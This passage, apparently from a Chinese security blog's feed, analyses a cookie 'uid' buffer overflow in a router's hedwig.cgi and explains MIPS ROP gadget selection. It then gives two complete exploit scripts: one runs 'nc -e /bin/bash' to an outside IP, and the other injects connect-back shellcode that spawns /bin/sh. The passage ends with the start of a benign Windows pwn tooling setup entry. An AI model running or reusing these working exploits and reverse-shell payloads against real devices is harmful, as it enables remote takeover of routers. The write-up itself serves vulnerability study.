class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = *v5;</span><br><span class="line">    <span class="keyword">if</span> ( !*v5 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v6 == <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">    <span class="keyword">if</span> ( v6 &lt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v7 == <span class="string">&#x27; &#x27;</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">      sobj_free(v2);</span><br><span class="line">      sobj_free(v4);</span><br><span class="line">LABEL_11:</span><br><span class="line">      <span class="keyword">if</span> ( v7 == <span class="string">&#x27;;&#x27;</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v6 = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v7 != <span class="string">&#x27;=&#x27;</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          sobj_add_char(v2, v7);</span><br><span class="line">          v6 = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v6 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v7 == <span class="string">&#x27;;&#x27;</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">      &#125;</span><br><span class="line">      sobj_add_char(v4, *v5++);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !sobj_strcmp(v2, <span class="string">&quot;uid&quot;</span>) )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">LABEL_18:</span><br><span class="line">      ++v5;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>其用于获得uid，<code>=</code>前面的内容被存入了<code>v2</code>，后面的内容被存入了<code>v4</code>，最后会对<code>v2</code>中的内容进行一个判断：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> ( !sobj_strcmp(v2, <span class="string">&quot;uid&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_21:</span><br><span class="line">    <span class="built_in">string</span> = (<span class="type">char</span> *)sobj_get_string(v4);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_27:</span><br><span class="line">  <span class="built_in">string</span> = getenv(<span class="string">&quot;REMOTE_ADDR&quot;</span>);</span><br><span class="line">LABEL_22:</span><br><span class="line">  result = sobj_add_string(a1, <span class="built_in">string</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v2 )</span><br><span class="line">    result = sobj_del(v2);</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    <span class="keyword">return</span> sobj_del(v4);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure><p>也就是判断等号前的内容是否为<code>uid</code>，判断通过了以后，就会将等号后面的字符串拼接入<code>a1</code>，也就是主函数传进来的参数<code>v4</code>。</p><p>再然后就到了一个非常关键的点</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sess_get_uid(v4);</span><br><span class="line"><span class="built_in">string</span> = (<span class="type">const</span> <span class="type">char</span> *)sobj_get_string(v4);</span><br><span class="line"><span class="built_in">sprintf</span>(v27, <span class="string">&quot;%s/%s/postxml&quot;</span>, <span class="string">&quot;/runtime/session&quot;</span>, <span class="built_in">string</span>);</span><br></pre></td></tr></table></figure><p>这里的<code>string</code>就是<code>v4</code>中的字符串，也<strong>就是<code>cookie</code>中<code>uid=</code>之后的内容</strong>，是可以由用户自由控制的，然而<code>v27</code>数组的大小仅有<code>1024</code>，因此，很容易造成缓冲区溢出。</p><p>在之后还有一个类似的<code>sprintf</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v20 = (<span class="type">const</span> <span class="type">char</span> *)sobj_get_string(v4);</span><br><span class="line"><span class="built_in">sprintf</span>(v27, <span class="string">&quot;/htdocs/webinc/fatlady.php\nprefix=%s/%s&quot;</span>, <span class="string">&quot;/runtime/session&quot;</span>, v20);</span><br></pre></td></tr></table></figure><p>这里的<code>string</code>仍然是<code>v4</code>，进一步观察，<strong>发现<code>v4</code>在两个<code>sprintf</code>之间未被改变过</strong>，也就是说，这里的<code>string</code>仍然是<code>cookie</code>中<code>uid=</code>后面的字符串，如果能走到这第二个<code>sprintf</code>的话，那么这里才是真正的溢出漏洞点，因为仍然是<code>v27</code>数组的溢出，两次拼接的字符串又一样，所以这里能覆盖上一次<code>sprintf</code>的内容。</p><p>容易看出，如果能走到第二个<code>sprintf</code>的话，就需要过这两个判断：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !v7 )</span><br><span class="line">&#123;</span><br><span class="line">  v1 = <span class="string">&quot;unable to open temp file.&quot;</span>;</span><br><span class="line">  <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( !haystack )</span><br><span class="line">&#123;</span><br><span class="line">  v1 = <span class="string">&quot;no xml data.&quot;</span>;</span><br><span class="line">  <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这第一个判断需要有<code>/var/tmp</code>这个目录，这个<strong>在真机上是有的</strong>，因此为了更真实地模拟环境，我们需要在解压后得到的文件系统内创建一个<code>/var/tmp</code>文件夹，这样<code>cgibin</code>才能在此路径下创建<code>temp.xml</code>文件用于数据的写入。</p><p>第二个判断<code>haystack</code>的值在这之前只有<code>cgibin_parse_request</code>的第一个参数<code>sub_409A6C</code>中可对其操作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *__fastcall <span class="title function_">sub_409A6C</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *result; <span class="comment">// $v0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( haystack )</span><br><span class="line">    <span class="built_in">free</span>(haystack);</span><br><span class="line">  result = (<span class="type">char</span> *)sobj_strdup(*(_DWORD *)(a2 + <span class="number">4</span>));</span><br><span class="line">  haystack = result;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个<code>sub_409A6C</code>函数<strong>需要<code>POST</code>传入内容</strong>的时候才能走到，那么就要使得<code>POST</code>传入内容</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>mips架构不同于x86能够直接进行跳转,其存在一些硬性要求</p><p>我们看system的开头</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00053200</span> <span class="number">02</span> <span class="number">00</span> <span class="number">1</span>C <span class="number">3</span>C E0 <span class="number">32</span> <span class="number">9</span>C <span class="number">27</span>       li      $gp, (_GLOBAL_OFFSET_TABLE_+<span class="number">0x7FF0</span> - .)  # Alternative name is <span class="string">&#x27;__libc_system&#x27;</span></span><br><span class="line">.text:<span class="number">00053208</span> <span class="number">21</span> E0 <span class="number">99</span> <span class="number">03</span>                   addu    $gp, $t9</span><br></pre></td></tr></table></figure><p>由于之后许多操作会使用到gp,所以这里<code>$t9</code>必须要是system的地址(虽然我也不懂为什么,但大佬是这么说的,而且<strong>这点算是非常通用的</strong>)</p><p>因此跳转到某个函数的时候，一定要通过<code>jalr $t9</code>类似的<code>gadget</code>进行跳转才行。</p><p>我们发现，最后的返回的时候，得是<strong>通过<code>$ra</code>寄存器中的地址跳转</strong>的，也就是说，我们在跳转到这个函数之前，就也得控制好<code>$ra</code>寄存器中的地址为我们跳转后执行完该函数，再下一个跳转到的地方。很方便的是，我们发现<code>move $t9, ...</code>这样的<code>gadget</code>之后，通常会有<code>lw $ra, ...</code>这样的<code>gadget</code>，最后再<code>jr $t9</code>，这类<code>gadget</code><strong>可以通过<code>mipsrop.tail()</code>来进行查找</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:00040640                               loc_40640:                               # CODE XREF: sub_405EC+34↑j</span><br><span class="line">.text:00040640 21 28 00 02                   move    $a1, $s0</span><br><span class="line">.text:00040644 21 C8 20 02                   move    $t9, $s1</span><br><span class="line">.text:00040648 24 00 BF 8F                   lw      $ra, 0x1C+var_s8($sp)</span><br><span class="line">.text:0004064C 20 00 B1 8F                   lw      $s1, 0x1C+var_s4($sp)</span><br><span class="line">.text:00040650 1C 00 B0 8F                   lw      $s0, 0x1C+var_s0($sp)</span><br><span class="line">.text:00040654 94 23 84 24                   addiu   $a0, 0x2394</span><br><span class="line">.text:00040658 08 00 20 03                   jr      $t9</span><br><span class="line">.text:0004065C 28 00 BD 27                   addiu   $sp, 0x28</span><br></pre></td></tr></table></figure><p>此外还需要注意这里system的最低字节恰好是<code>\x00</code>,所以最好跳转其之前(刚好是几个<code>\x00</code>在mips中是nop)</p><p>第一个问题解决,现在第二个如何控制参数</p><p>我们想要一个<code>addiu $a0, $sp, ...</code>的<code>gadget</code>，但是这样的<code>gadget</code>一般来说没有能满足我们要求的，之后的跳转大多都不太方便。</p><p>于是，我们想到可以通过如<code>addiu $s0, $sp, ...</code>和<code>move $a0, $s0</code>的组合命令实现，而一些原本要跳到<code>mempcpy</code>函数的地方，由于<code>mempcpy</code>函数的特性，恰好会同时包含上面两个<code>gadget</code>，也就不需要分两次跳转了，一段<code>gadget</code>就能搞定，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:00015B68 AC 02 C5 8F                   lw      $a1, 0x280+arg_4($fp)</span><br><span class="line">.text:00015B6C 18 00 B2 27                   addiu   $s2, $sp, 0x280+var_268</span><br><span class="line">.text:00015B70 21 30 60 00                   move    $a2, $v1</span><br><span class="line">.text:00015B74 21 C8 00 02                   move    $t9, $s0</span><br><span class="line">.text:00015B78 09 F8 20 03                   jalr    $t9 ; mempcpy</span><br><span class="line">.text:00015B7C 21 20 40 02                   move    $a0, $s2</span><br></pre></td></tr></table></figure><p>这里由于上面所说的流水线指令集的特性，在跳转到<code>t9</code>之前，其第一个参数<code>$a0</code>就已经被赋为<code>$s2</code>了。</p><p>至此两个问题解决</p><p>exp来自winmt大佬</p><p><strong>rop:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;mips&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">cmd = <span class="string">b&#x27;nc -e /bin/bash 192.168.192.131 8888&#x27;</span></span><br><span class="line"> </span><br><span class="line">libc_base = <span class="number">0x77f34000</span></span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x3cd</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x53200</span> - <span class="number">1</span>) <span class="comment"># s0  system_addr - 1</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x169C4</span>) <span class="comment"># s1  addiu $s2, $sp, 0x18 (=&gt; jalr $s0)</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">4</span>*<span class="number">7</span>)</span><br><span class="line">payload += p32(libc_base + <span class="number">0x32A98</span>) <span class="comment"># ra  addiu $s0, 1 (=&gt; jalr $s1)</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">payload += cmd</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;http://192.168.192.133:1234/hedwig.cgi&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;winmt&quot;</span> : <span class="string">&quot;pwner&quot;</span>&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>        : <span class="string">b&quot;uid=&quot;</span> + payload,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>  : <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Length&quot;</span>: <span class="string">&quot;11&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url = url, headers = headers, data = data)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><p><strong>rop+shellcode</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;mips&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">libc_base = <span class="number">0x77f34000</span></span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x3cd</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x436D0</span>) <span class="comment"># s1  move $t9, $s3 (=&gt; lw... =&gt; jalr $t9)</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x56BD0</span>) <span class="comment"># s3  sleep</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">4</span>*<span class="number">5</span>)</span><br><span class="line">payload += p32(libc_base + <span class="number">0x57E50</span>) <span class="comment"># ra  li $a0, 1 (=&gt; jalr $s1)</span></span><br><span class="line"> </span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">4</span>*<span class="number">4</span>)</span><br><span class="line">payload += p32(libc_base + <span class="number">0x37E6C</span>) <span class="comment"># s4  move  $t9, $a1 (=&gt; jalr $t9)</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x3B974</span>) <span class="comment"># ra  addiu $a1, $sp, 0x18 (=&gt; jalr $s4)</span></span><br><span class="line"> </span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    slti $a0, $zero, 0xFFFF</span></span><br><span class="line"><span class="string">    li $v0, 4006</span></span><br><span class="line"><span class="string">    syscall 0x42424</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    slti $a0, $zero, 0x1111</span></span><br><span class="line"><span class="string">    li $v0, 4006</span></span><br><span class="line"><span class="string">    syscall 0x42424</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    li $t4, 0xFFFFFFFD</span></span><br><span class="line"><span class="string">    not $a0, $t4</span></span><br><span class="line"><span class="string">    li $v0, 4006</span></span><br><span class="line"><span class="string">    syscall 0x42424</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    li $t4, 0xFFFFFFFD</span></span><br><span class="line"><span class="string">    not $a0, $t4</span></span><br><span class="line"><span class="string">    not $a1, $t4</span></span><br><span class="line"><span class="string">    slti $a2, $zero, 0xFFFF</span></span><br><span class="line"><span class="string">    li $v0, 4183</span></span><br><span class="line"><span class="string">    syscall 0x42424</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    andi $a0, $v0, 0xFFFF</span></span><br><span class="line"><span class="string">    li $v0, 4041</span></span><br><span class="line"><span class="string">    syscall 0x42424</span></span><br><span class="line"><span class="string">    li $v0, 4041</span></span><br><span class="line"><span class="string">    syscall 0x42424</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    lui $a1, 0xB821 # Port: 8888</span></span><br><span class="line"><span class="string">    ori $a1, 0xFF01</span></span><br><span class="line"><span class="string">    addi $a1, $a1, 0x0101</span></span><br><span class="line"><span class="string">    sw $a1, -8($sp)</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    li $a1, 0x83C0A8C0 # IP: 192.168.192.131</span></span><br><span class="line"><span class="string">    sw $a1, -4($sp)</span></span><br><span class="line"><span class="string">    addi $a1, $sp, -8</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    li $t4, 0xFFFFFFEF</span></span><br><span class="line"><span class="string">    not $a2, $t4</span></span><br><span class="line"><span class="string">    li $v0, 4170</span></span><br><span class="line"><span class="string">    syscall 0x42424</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    lui $t0, 0x6962</span></span><br><span class="line"><span class="string">    ori $t0, $t0,0x2f2f</span></span><br><span class="line"><span class="string">    sw $t0, -20($sp)</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    lui $t0, 0x6873</span></span><br><span class="line"><span class="string">    ori $t0, 0x2f6e</span></span><br><span class="line"><span class="string">    sw $t0, -16($sp)</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    slti $a3, $zero, 0xFFFF</span></span><br><span class="line"><span class="string">    sw $a3, -12($sp)</span></span><br><span class="line"><span class="string">    sw $a3, -4($sp)</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    addi $a0, $sp, -20</span></span><br><span class="line"><span class="string">    addi $t0, $sp, -20</span></span><br><span class="line"><span class="string">    sw $t0, -8($sp)</span></span><br><span class="line"><span class="string">    addi $a1, $sp, -8</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    addiu $sp, $sp, -20</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    slti $a2, $zero, 0xFFFF</span></span><br><span class="line"><span class="string">    li $v0, 4011</span></span><br><span class="line"><span class="string">    syscall 0x42424</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">payload += shellcode</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;http://192.168.192.133:1234/hedwig.cgi&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;winmt&quot;</span> : <span class="string">&quot;pwner&quot;</span>&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>        : <span class="string">b&quot;uid=&quot;</span> + payload,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>  : <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Length&quot;</span>: <span class="string">&quot;11&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url = url, headers = headers, data = data)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><p>最终成功getshell</p>]]></content>
    
    
    <summary type="html">固件分析</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="iot" scheme="https://ixout.github.io/tags/iot/"/>
    
    <category term="固件分析" scheme="https://ixout.github.io/tags/%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>windows pwn</title>
    <link href="https://ixout.github.io/posts/53436/"/>
    <id>https://ixout.github.io/posts/53436/</id>
    <published>2024-02-03T15:02:37.000Z</published>
    <updated>2024-04-18T09:11:11.301Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><p><a href="https://github.com/Wenzel/checksec.py">Wenzel/checksec.py: Checksec tool in Python, Rich output. Based on LIEF (github.com)</a></p><h2 id="winpwn"><a href="#winpwn" class="headerlink" title="winpwn"></a>winpwn</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pip3 install winpwn</span><br><span class="line"></span><br><span class="line">pip3 install pefile</span><br><span class="line"></span><br><span class="line">pip3 install keystone-engine</span><br><span class="line"></span><br><span class="line">pip3 install install capstone</span><br></pre></td></tr></table></figure><h2 id="windbg"><a href="#windbg" class="headerlink" title="windbg"></a>windbg</h2><p>microsoft store下载</p><p>配置到winpwn调试</p><p>在HOMEDIR创建.winpwn</p><p>填入一下内容,自行更改路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;debugger&quot;:&#123;</span><br><span class="line">        &quot;i386&quot;: &#123;</span><br><span class="line">            &quot;x64dbg&quot;: &quot;F:\\ctfTools\\debugTools\\x64debug\\release\\x32\\x32dbg.exe&quot;, </span><br><span class="line">            &quot;gdb&quot;: &quot;F:\\ctfTools\\windows-gdb\\mingw-w64-686\\mingw32\\bin\\gdb.exe&quot;, </span><br><span class="line">            &quot;windbg&quot;: &quot;C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x86\\windbg.exe&quot;,</span><br><span class="line">            &quot;windbgx&quot;: &quot;C:\\Users\\byzero\\AppData\\Local\\Microsoft\\WindowsApps\\Microsoft.WinDbg_8wekyb3d8bbwe\\WinDbgX.exe&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;amd64&quot;: &#123;</span><br><span class="line">            &quot;x64dbg&quot;: &quot;F:\\ctfTools\\debugTools\\x64debug\\release\\x64\\x64dbg.exe&quot;, </span><br><span class="line">            &quot;gdb&quot;: &quot;F:\\ctfTools\\windows-gdb\\mingw-w64-64\\mingw64\\bin\\gdb64.exe&quot;, </span><br><span class="line">            &quot;windbg&quot;: &quot;C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\windbg.exe&quot;,</span><br><span class="line">            &quot;windbgx&quot;: &quot;C:\\Users\\byzero\\AppData\\Local\\Microsoft\\WindowsApps\\Microsoft.WinDbg_8wekyb3d8bbwe\\WinDbgX.exe&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;debugger_init&quot;: &#123;</span><br><span class="line">        &quot;i386&quot;: &#123;</span><br><span class="line">            &quot;x64dbg&quot;: &quot;&quot;, </span><br><span class="line">            &quot;gdb&quot;: &quot;&quot;, </span><br><span class="line">            &quot;windbg&quot;: &quot;.load E:\\ShareDir\\building\\bywin\\pykd_ext_2.0.0.24\\x86\\pykd.dll;!py -g E:\\ShareDir\\building\\bywin\\byinit.py;&quot;,</span><br><span class="line">            &quot;windbgx&quot;: &quot;.load E:\\ShareDir\\building\\bywin\\pykd_ext_2.0.0.24\\x86\\pykd.dll;!py -g E:\\ShareDir\\building\\bywin\\byinit.py;&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;amd64&quot;: &#123;</span><br><span class="line">            &quot;x64dbg&quot;: &quot;&quot;, </span><br><span class="line">            &quot;gdb&quot;: &quot;&quot;, </span><br><span class="line">            &quot;windbg&quot;: &quot;.load E:\\ShareDir\\building\\bywin\\pykd_ext_2.0.0.24\\x64\\pykd.dll;!py -g E:\\ShareDir\\building\\bywin\\byinit.py;&quot;,</span><br><span class="line">            &quot;windbgx&quot;: &quot;.load E:\\ShareDir\\building\\bywin\\pykd_ext_2.0.0.24\\x64\\pykd.dll;!py -g E:\\ShareDir\\building\\bywin\\byinit.py;&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="winserver"><a href="#winserver" class="headerlink" title="winserver"></a>winserver</h2><p><a href="https://github.com/Ex-Origin/win_server">https://github.com/Ex-Origin/win_server</a></p><h2 id="ProcessExplorer"><a href="#ProcessExplorer" class="headerlink" title="ProcessExplorer"></a>ProcessExplorer</h2><p><a 